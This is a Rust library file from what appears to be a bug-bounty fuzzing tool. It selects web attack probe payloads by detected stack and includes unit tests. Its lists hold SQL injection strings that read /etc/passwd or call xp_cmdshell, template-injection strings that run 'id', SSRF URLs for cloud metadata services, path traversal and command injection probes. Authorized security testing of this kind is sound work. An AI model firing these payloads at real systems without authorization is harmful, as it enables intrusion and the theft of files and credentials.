/*******************************************************************
 * Filename:        lib.rs
 * Author:          Jeff
 * Date:            2026-05-15
 * Description:     Stack-aware payload selection for bounded fuzzing
 * Notes:           Payloads are small bug-bounty probe sets, not exhaustive
 *                  exploit lists. Callers still enforce scope and rate policy.
 *******************************************************************/

use engagement::Engagement;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DbEngine {
    Generic,
    Mysql,
    Postgresql,
    Mssql,
    Sqlite,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Framework {
    Generic,
    Django,
    Express,
    Laravel,
    Rails,
    AspNet,
    NextJs,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TplEngine {
    Generic,
    Jinja2,
    Twig,
    Freemarker,
    Pebble,
    Velocity,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ParameterType {
    Path,
    Query,
    Body,
    Header,
    Cookie,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ValueHint {
    Numeric,
    Uuid,
    Email,
    Url,
    FreeText,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CloudProvider {
    Aws,
    Gcp,
    Azure,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PayloadContext {
    pub backend_db: Option<DbEngine>,
    pub framework: Option<Framework>,
    pub template_engine: Option<TplEngine>,
    pub cloud: Option<CloudProvider>,
    pub content_type: Option<String>,
    pub parameter_type: ParameterType,
    pub value_hint: ValueHint,
}

impl Default for PayloadContext {
    // Build a conservative generic context
    fn default() -> Self {
        Self {
            backend_db: None,
            framework: None,
            template_engine: None,
            cloud: None,
            content_type: None,
            parameter_type: ParameterType::Query,
            value_hint: ValueHint::FreeText,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PayloadSet {
    Sqli,
    Xss,
    Ssti,
    Ssrf,
    PathTraversal,
    Idor,
    OpenRedirect,
    CommandInjection,
}

impl PayloadSet {
    // Parse CLI payload-set names and common aliases
    pub fn from_name(name: &str) -> Option<Self> {
        match name {
            "sqli" | "sql" => Some(Self::Sqli),
            "xss" => Some(Self::Xss),
            "ssti" => Some(Self::Ssti),
            "ssrf" => Some(Self::Ssrf),
            "traversal" | "path-traversal" | "lfi" => Some(Self::PathTraversal),
            "idor" | "bola" => Some(Self::Idor),
            "open-redirect" | "redirect" => Some(Self::OpenRedirect),
            "cmdi" | "command-injection" => Some(Self::CommandInjection),
            _ => None,
        }
    }
}

// Return stack-aware payloads for one set and context
pub fn get_payloads(set: PayloadSet, ctx: &PayloadContext) -> Vec<String> {
    let mut payloads = match set {
        PayloadSet::Sqli => sqli_payloads(ctx),
        PayloadSet::Xss => xss_payloads(ctx),
        PayloadSet::Ssti => ssti_payloads(ctx),
        PayloadSet::Ssrf => ssrf_payloads(ctx),
        PayloadSet::PathTraversal => path_traversal_payloads(),
        PayloadSet::Idor => idor_payloads(ctx),
        PayloadSet::OpenRedirect => open_redirect_payloads(),
        PayloadSet::CommandInjection => command_injection_payloads(),
    };
    dedup(&mut payloads);
    payloads
}

// Infer a payload context from recon summary/fingerprint output
pub fn get_payload_context_from_engagement(eng: &Engagement) -> PayloadContext {
    let mut ctx = PayloadContext::default();
    let summary_path = eng.recon_dir().join("summary.json");
    let Ok(raw) = std::fs::read_to_string(summary_path) else {
        return ctx;
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(&raw) else {
        return ctx;
    };
    let Some(hosts) = value.get("hosts").and_then(|hosts| hosts.as_array()) else {
        return ctx;
    };

    for host in hosts {
        let Some(fingerprint) = host.get("fingerprint") else {
            continue;
        };
        let combined = [
            fingerprint.get("server"),
            fingerprint.get("framework"),
            fingerprint.get("cms"),
            fingerprint.get("cloud"),
            fingerprint.get("powered_by"),
        ]
        .into_iter()
        .flatten()
        .filter_map(|value| value.as_str())
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase();

        ctx.framework = ctx.framework.or_else(|| infer_framework(&combined));
        ctx.backend_db = ctx.backend_db.or_else(|| infer_db(&combined));
        ctx.template_engine = ctx
            .template_engine
            .or_else(|| infer_template_engine(&combined));
        ctx.cloud = ctx.cloud.or_else(|| infer_cloud(&combined));
    }

    ctx
}

// Build SQLi probes for the detected database
fn sqli_payloads(ctx: &PayloadContext) -> Vec<String> {
    let mut payloads = strings(&[
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "1 OR 1=1",
        "' AND 1=2--",
    ]);
    match ctx.backend_db.unwrap_or(DbEngine::Generic) {
        DbEngine::Mysql => payloads.extend(strings(&[
            "1 AND SLEEP(5)--",
            "/*!UNION*/ SELECT NULL",
            "LOAD_FILE('/etc/passwd')",
            "' INTO OUTFILE '/tmp/geist'--",
        ])),
        DbEngine::Postgresql => payloads.extend(strings(&[
            "1; SELECT pg_sleep(5)--",
            "'::text--",
            "$$geist$$",
            "COPY (SELECT version()) TO STDOUT",
        ])),
        DbEngine::Mssql => payloads.extend(strings(&[
            "1; WAITFOR DELAY '0:0:5'--",
            "EXEC('SELECT 1')",
            "xp_cmdshell",
        ])),
        DbEngine::Sqlite => payloads.extend(strings(&[
            "sqlite_version()",
            "randomblob(1000000)",
            "' || sqlite_version() || '",
        ])),
        DbEngine::Generic => {}
    }
    payloads
}

// Build XSS probes with framework hints
fn xss_payloads(ctx: &PayloadContext) -> Vec<String> {
    let mut payloads = strings(&[
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
    ]);
    if matches!(ctx.framework, Some(Framework::NextJs)) {
        payloads.push("__NEXT_DATA__</script><script>alert(1)</script>".into());
    }
    payloads
}

// Build SSTI probes for the detected template engine/framework
fn ssti_payloads(ctx: &PayloadContext) -> Vec<String> {
    let mut payloads = strings(&["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]);
    match ctx.template_engine.unwrap_or(TplEngine::Generic) {
        TplEngine::Jinja2 | TplEngine::Twig => payloads.extend(strings(&[
            "{{config}}",
            "{{self}}",
            "{{request.application.__globals__}}",
        ])),
        TplEngine::Freemarker => payloads
            .push("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}".into()),
        TplEngine::Pebble => payloads.push("{{runtime.exec(\"id\")}}".into()),
        TplEngine::Velocity => {
            payloads.push("#set($x='')##$x.class.forName('java.lang.Runtime')".into())
        }
        TplEngine::Generic => {}
    }
    payloads
}

// Build SSRF probes using cloud metadata hints
fn ssrf_payloads(ctx: &PayloadContext) -> Vec<String> {
    let mut payloads = strings(&["http://localhost/", "http://127.0.0.1/", "http://[::1]/"]);
    match ctx.cloud {
        Some(CloudProvider::Aws) => {
            payloads.push("http://169.254.169.254/latest/meta-data/".into())
        }
        Some(CloudProvider::Gcp) => payloads.push("http://metadata.google.internal/".into()),
        Some(CloudProvider::Azure) => {
            payloads.push("http://169.254.169.254/metadata/instance".into())
        }
        None => payloads.extend(strings(&[
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://169.254.169.254/metadata/instance",
        ])),
    }
    payloads
}

// Build path traversal payloads
fn path_traversal_payloads() -> Vec<String> {
    strings(&[
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "..%2Fetc%2Fpasswd",
        "..\\..\\windows\\win.ini",
        "/proc/self/environ",
    ])
}

// Build IDOR payloads around the current value shape
fn idor_payloads(ctx: &PayloadContext) -> Vec<String> {
    match ctx.value_hint {
        ValueHint::Numeric => strings(&["0", "1", "2", "999999", "-1"]),
        ValueHint::Uuid => strings(&[
            "00000000-0000-0000-0000-000000000000",
            "11111111-1111-1111-1111-111111111111",
        ]),
        _ => strings(&["1", "2", "admin", "me", "current"]),
    }
}

// Build open redirect payloads
fn open_redirect_payloads() -> Vec<String> {
    strings(&[
        "https://example.com",
        "//example.com",
        "///example.com/%2f..",
        "https://example.com@target.invalid",
        "/\\example.com",
    ])
}

// Build command injection probes
fn command_injection_payloads() -> Vec<String> {
    strings(&[";id", "|id", "&&id", "`id`", "$(id)", "\n id"])
}

// Infer database engine from fingerprint text
fn infer_db(raw: &str) -> Option<DbEngine> {
    if raw.contains("mysql") || raw.contains("mariadb") {
        Some(DbEngine::Mysql)
    } else if raw.contains("postgres") {
        Some(DbEngine::Postgresql)
    } else if raw.contains("mssql") || raw.contains("sql server") || raw.contains("asp.net") {
        Some(DbEngine::Mssql)
    } else if raw.contains("sqlite") {
        Some(DbEngine::Sqlite)
    } else {
        None
    }
}

// Infer framework from fingerprint text
fn infer_framework(raw: &str) -> Option<Framework> {
    if raw.contains("django") {
        Some(Framework::Django)
    } else if raw.contains("express") {
        Some(Framework::Express)
    } else if raw.contains("laravel") {
        Some(Framework::Laravel)
    } else if raw.contains("rails") {
        Some(Framework::Rails)
    } else if raw.contains("aspnet") || raw.contains("asp.net") {
        Some(Framework::AspNet)
    } else if raw.contains("nextjs") || raw.contains("next.js") {
        Some(Framework::NextJs)
    } else {
        None
    }
}

// Infer template engine from fingerprint text
fn infer_template_engine(raw: &str) -> Option<TplEngine> {
    if raw.contains("jinja") || raw.contains("django") {
        Some(TplEngine::Jinja2)
    } else if raw.contains("twig") || raw.contains("laravel") {
        Some(TplEngine::Twig)
    } else if raw.contains("freemarker") {
        Some(TplEngine::Freemarker)
    } else if raw.contains("pebble") {
        Some(TplEngine::Pebble)
    } else if raw.contains("velocity") {
        Some(TplEngine::Velocity)
    } else {
        None
    }
}

// Infer cloud provider from fingerprint text
fn infer_cloud(raw: &str) -> Option<CloudProvider> {
    if raw.contains("aws") || raw.contains("amazon") || raw.contains("cloudfront") {
        Some(CloudProvider::Aws)
    } else if raw.contains("gcp") || raw.contains("google") {
        Some(CloudProvider::Gcp)
    } else if raw.contains("azure") || raw.contains("x-ms-") {
        Some(CloudProvider::Azure)
    } else {
        None
    }
}

// Convert string slices into owned payloads
fn strings(values: &[&str]) -> Vec<String> {
    values.iter().map(|value| (*value).to_string()).collect()
}

// Deduplicate payloads while preserving order
fn dedup(payloads: &mut Vec<String>) {
    let mut seen = std::collections::HashSet::new();
    payloads.retain(|payload| seen.insert(payload.clone()));
}

#[cfg(test)]
mod tests {
    use super::*;
    use engagement::{Engagement, EngagementMeta};
    use std::sync::atomic::{AtomicU64, Ordering};

    // Create a temporary engagement root
    fn test_engagement() -> Engagement {
        static COUNTER: AtomicU64 = AtomicU64::new(0);
        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
        let parent =
            std::env::temp_dir().join(format!("payload-engine-test-{}-{n}", std::process::id()));
        let _ = std::fs::remove_dir_all(&parent);
        let meta = EngagementMeta {
            name: "acme".into(),
            target: "example.com".into(),
            created_at: String::new(),
            platform: None,
            url: None,
            tags: Vec::new(),
        };
        Engagement::init(&parent, meta).unwrap()
    }

    #[test]
    fn mysql_context_adds_mysql_payloads() {
        let ctx = PayloadContext {
            backend_db: Some(DbEngine::Mysql),
            ..PayloadContext::default()
        };
        let payloads = get_payloads(PayloadSet::Sqli, &ctx);
        assert!(payloads.iter().any(|payload| payload.contains("LOAD_FILE")));
    }

    #[test]
    fn cloud_context_adds_specific_ssrf_payload() {
        let ctx = PayloadContext {
            cloud: Some(CloudProvider::Gcp),
            ..PayloadContext::default()
        };
        let payloads = get_payloads(PayloadSet::Ssrf, &ctx);
        assert!(
            payloads
                .iter()
                .any(|payload| payload.contains("metadata.google.internal"))
        );
    }

    #[test]
    fn parses_payload_set_aliases() {
        assert_eq!(PayloadSet::from_name("sql"), Some(PayloadSet::Sqli));
        assert_eq!(
            PayloadSet::from_name("open-redirect"),
            Some(PayloadSet::OpenRedirect)
        );
        assert_eq!(PayloadSet::from_name("numbers:1-10"), None);
    }

    #[test]
    fn infers_context_from_summary_json() {
        let engagement = test_engagement();
        let summary = serde_json::json!({
            "hosts": [{
                "hostname": "api.example.com",
                "fingerprint": {
                    "server": "nginx",
                    "framework": "django",
                    "cloud": "cloudfront"
                }
            }]
        });
        std::fs::write(
            engagement.recon_dir().join("summary.json"),
            serde_json::to_string_pretty(&summary).unwrap(),
        )
        .unwrap();

        let ctx = get_payload_context_from_engagement(&engagement);

        assert_eq!(ctx.framework, Some(Framework::Django));
        assert_eq!(ctx.template_engine, Some(TplEngine::Jinja2));
        assert_eq!(ctx.cloud, Some(CloudProvider::Aws));
    }
}
